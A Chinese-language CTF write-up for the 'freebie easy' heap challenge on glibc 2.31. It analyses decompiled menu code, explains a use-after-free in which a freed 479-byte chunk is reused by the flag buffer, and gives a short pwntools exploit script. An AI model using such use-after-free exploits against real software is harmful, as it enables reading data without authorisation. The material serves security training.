# freebie easy wp

## 题面
Exploit a use-after-free vulnerability to get the flag.  

远程为 glibc 2.31-0ubuntu9.18_amd64  
## 分析
ida 反编译。交互界面主要有 4 个功能：  
### malloc
```c
if ( strcmp(s1, "malloc") )
  break;
printf("Size: ");
__isoc99_scanf("%127s", s1);
puts(byte_2419);
size = atoi(s1);
printf("[*] allocations[%d] = malloc(%d)\n", 0, size);
ptr = malloc(size);
printf("[*] allocations[%d] = %p\n", 0, ptr);
```

malloc 大小为 s1 的空间，并输出分配的地址。  

### free
``` c
if ( strcmp(s1, "free") )
  break;
printf("[*] free(allocations[%d])\n", 0);
free(ptr);
```
free 掉分配的内存，这看起来好像有问题，ptr 不会变化。  

### puts
``` c
if ( strcmp(s1, "puts") )
  break;
printf("[*] puts(allocations[%d])\n", 0);
printf("Data: ");
puts((const char *)ptr);
```
打印 ptr 指针的字符串。  

### read_flag
``` c
if ( strcmp(s1, "read_flag") )
  break;
for ( i = 0; i <= 0; ++i )
{
  printf("[*] flag_buffer = malloc(%d)\n", 479);
  size_4 = malloc(0x1DFu);
  printf("[*] flag_buffer = %p\n", size_4);
}
v3 = open("/flag", 0);
read(v3, size_4, 0x80u);
puts("[*] read the flag!");
```

malloc 479 字节的空间，然后将 flag 读到该空间内。  

## 利用
因为 glibc 堆分配器会从 bins 中寻找并复用大小近似的 free chunks。所以可以 malloc 个 479 字节的内存然后再 free 掉，之后 read_flag 分配的空间会直接用刚才 free 掉的地址。这样我们 puts 读到的就是 flag 了。  

## exp
``` python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = process("./freebie-easy")


def malloc(size: int):
    io.recvuntil(b"):")
    io.sendline(b"malloc")
    io.recvuntil(b"Size:")
    io.sendline(str(size).encode())


def free():
    io.recvuntil(b"):")
    io.sendline(b"free")


def puts():
    io.recvuntil(b"):")
    io.sendline(b"puts")


def read_flag():
    io.recvuntil(b"):")
    io.sendline(b"read_flag")


malloc(479)
free()
read_flag()
puts()

io.interactive()
```
